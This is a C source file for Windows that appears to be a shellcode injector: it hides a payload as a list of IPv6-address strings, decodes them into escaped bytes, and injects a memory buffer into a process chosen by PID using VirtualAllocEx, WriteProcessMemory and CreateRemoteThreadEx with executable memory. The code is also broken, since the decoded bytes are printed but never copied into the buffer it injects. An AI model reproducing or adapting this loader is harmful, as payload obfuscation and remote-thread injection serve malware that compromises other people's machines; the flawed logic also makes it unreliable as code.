#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Some macros to help in the process of writing and printing texts
#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;


void ipv6_to_shellcode(const char* ip_addresses[], size_t count) {
    for (size_t i = 0; i < count; i++) {
        const char* ipv6_str = ip_addresses[i];
        size_t len = strlen(ipv6_str);

        // Print the beginning of the shellcode string
        printf("\"");

        for (size_t j = 0; j < len; j++) {
            // Skip colons
            if (ipv6_str[j] == ':') {
                continue;
            }

            // Print the hexadecimal bytes in \x format
            printf("\\x%c%c", ipv6_str[j], ipv6_str[j + 1]);

            // Move to the next pair of hex characters
            j++;
        }

        // Print the end of the shellcode string
        printf("\"\n");
    }
}


int main(int argc, char* argv[]) {
    const char* ip_addresses[] = {
    "56e3:2f49:5e47:7cb1:b2b3:f5e4:f7e7:eae8",
    "ecf3:8d6f:dbf7:4b93:a28b:4f97:de8f:439b",
    "ea86:fd04:86c0:679b:989b:5fa7:869f:e919",
    "76e7:bda1:dcf3:c0a0:232a:e9a4:e726:0a04",
    "b8aa:bda5:65bd:d07a:b0cf:bcf4:2691:7981",
    "e2f0:fef2:7b8d:0001:0288:848d:0607:0841",
    "8fcb:786a:460e:c041:995b:0c51:9d57:3850",
    "1bcb:ff4b:532e:e969:ddea:65ae:12af:6028",
    "fc63:1ded:6fee:f93c:9e72:35f4:0ed7:4dc8",
    "7638:7019:367a:7990:379b:1c01:cd07:6c00",
    "4b9b:2a0c:c543:1815:d913:481c:5787:19d2",
    "5ed3:145c:8e1e:3820:3a3d:3d3f:273f:2930",
    "2b31:24ee:824f:3123:8d93:2c34:2f2d:30f2",
    "6892:3782:8180:ddc8:3cf4:f7b7:d9b4:ba89",
    "8aca:dac4:0769:d810:7e33:9595:96de:117c",
    "d327:9e9d:8fc3:0cbb:15e1:e5f1:ef2e:4ce5",
    "235a:ed17:e2d8:96b6:4d66:f83c:5cdf:b9b8",
    "babb:e5fc:0496:40aa:c23c:11af:cc86:9699",
    "9a86:fd04:83fe:1099:2d13:9c5c:149f:2719",
    "9252:1d9c:6435:ef3e:021c:31ad:6f20:82f9",
    "abb3:a064:0ca7:7908:b349:6d50:8296:072c",
    "7f3b:88f7:b700:ce74:e7eb:9705:0607:408a",
    "e61b:4484:ec42:21d8:7817:554d:5e9e:e158",
    "a019:c5d5:41e0:f5a2:da23:5a70:6ea4:ec09",
    "74a2:da47:6e6e:6959:3223:3435:776f:70b0",
    "c873:0df4:7f85:18e5:11a6:bb90:0ece:8b00",
    "c38c:017c:8706:d9a1:1ada:8e1d:dfae:19e3",
    "5882:9402:a18a:e399:621e:4c3d:2730:3101",
    "6a2b:6c6d:2f37:1a71:2832:ce7e:5978:4886",
    "af2c:253c:c40a:eecc:e37c:51cc:7949:61b5",
    "7574:73c5:8f4c:d8b8:54db:1163:e323:d966",
    "7dc3:f69d:c724:40bc:88a9:e52c:7c58:7da9",
    "4500:cc00:cc00:cc00:cc00:cc00:cc00:cc00"
    };

    size_t count = sizeof(ip_addresses) / sizeof(ip_addresses[0]);
    uint8_t* shellcode = (uint8_t*)malloc(count * 16); // Allocate 16 bytes per IPv6 address

    if (shellcode == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 1;
    }

    // Convert IP addresses to shellcode manually
    ipv6_to_shellcode(ip_addresses, count);

    // Print the shellcode
    
    if (argc < 2) {
        warning("You should enter the process ID to inject the SHELLCODE in!!\nUSAGE: R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    info("Now we are trying to open the process with the ID: %ld\n", PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

    if (hProcess != NULL) {
        okay("We got handle on the process: 0x%p", hProcess);

        // Allocate some bytes to the process memory
        rBuffer = VirtualAllocEx(hProcess, NULL, count * 16, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions inside process %ld", count * 16, PID);

        // Write the shellcode into the allocated process memory
        WriteProcessMemory(hProcess, rBuffer, shellcode, count * 16, NULL);
        info("Wrote %zu bytes to process memory\n", count * 16);

        // Create a remote thread to run the payload
        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

        if (hThread == NULL) {
            warning("The PID %ld doesn't exist, you should try other stuff\nError %ld", PID, GetLastError());
            CloseHandle(hProcess);
            return EXIT_FAILURE;
        }
        okay("We got handle on the Thread %ld: 0x%p", TID, hThread);

        okay("Cleaning up everything!!");
        info("Waiting for thread to finish...\n");
        WaitForSingleObject(hThread, INFINITE);
        info("Thread finished executing :)\n");

        CloseHandle(hProcess);
        CloseHandle(hThread);

        info("Finished, see you next time mate! ;)\n");

        return 0;
    }
    else {
        warning("The PID %ld doesn't exist, you should try other stuff\nError %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }
}
